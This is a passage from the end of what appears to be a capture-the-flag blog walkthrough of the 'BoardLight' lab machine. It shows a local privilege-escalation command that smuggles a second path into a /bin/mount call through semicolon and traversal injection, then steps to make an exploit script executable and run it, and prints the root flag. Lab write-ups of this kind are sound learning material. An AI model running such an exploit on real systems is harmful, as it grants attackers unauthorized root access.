<span class="hljs-variable">$&#123;file&#125;</span> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(<span class="hljs-built_in">id</span> -u), <span class="hljs-string">&quot;/dev/../tmp/;/tmp/exploit&quot;</span> /tmp///net</code></pre>

<p>Now change executable permissions to the exploit and run it :</p>
<pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x exploit.sh</code></pre>

<p>→ Run</p>
<pre><code class="hljs bash">./exploit.s</code></pre>

<p>→ </p>
<p><img src="/../BoardLight_img/8.png" alt="alt text"></p>
<p>Get Root:</p>
<p><img src="/../BoardLight_img/9.png" alt="alt text"></p>
<p>Root.txt Flag: <code>f1cc47f19a4c7a3f34cf04625874e8fa</code></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/07/26/PermX/" title="PermX"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: PermX</span></a><a class="button is-default" href="/2024/07/19/Web-Penetration-Testing-tools/" title="Web Penetration Testing tools"><span class="has-text-weight-semibold">Next: Web Penetration Testing tools</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/razvan-popa-333740293"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Rãzvan 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>